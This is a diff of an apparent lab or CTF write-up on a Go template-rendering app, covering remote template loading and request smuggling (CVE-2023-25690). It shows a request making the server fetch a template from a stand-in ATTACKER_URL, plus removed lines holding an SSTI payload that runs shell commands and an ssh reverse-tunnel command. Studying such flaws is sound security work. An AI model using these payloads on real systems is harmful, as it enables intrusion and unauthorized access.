@@ -11,15 +11,11 @@ So, the functionality of the application seems to load and render templates eith
 ## Set Up
 
 1. Burpsuite Repeater/collaborator(Testing): GET requests to /render?use_remote=true&page=https://ATTACKER_URL/test.go.
-2. Apache2 server hosting test.go).
-3. Setup file with SSTI payload:
-   ```go
-    {{.FetchServerInfo "cd /;ls -la"}}
-5. Tunnel using `ssh -R 80:localhost:80 localhost.run -i /home/$user/.ssh/id_rsa`.
 
 ## Exploit
-<img src= "exploited_website.PNG">
+<img src= "exploited_html_)smuggling.PNG">
 
 ## More Information
 
 [CVE-2023-25690-POC](https://github.com/dhmosfunk/CVE-2023-25690-POC/tree/main#internal-http-request-smuggling-via-header-injection)
+<summary> The impact of this vulnerability is that it allows attackers to target and access internal applications that are meant to be hidden by the reverse proxy, potentially leading to unauthorized access, data leakage, or further exploitation.</summary>
